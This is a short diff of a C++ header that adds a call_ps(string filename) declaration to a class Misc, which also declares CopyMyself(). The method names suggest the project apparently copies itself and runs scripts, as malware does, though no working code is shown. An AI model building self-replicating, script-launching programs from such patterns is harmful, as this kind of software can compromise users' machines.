@@ -10,5 +10,6 @@ using namespace std;
 class Misc {
 public:
 	string current_working_directory();
+	void call_ps(string filename);
 	void CopyMyself();
 };
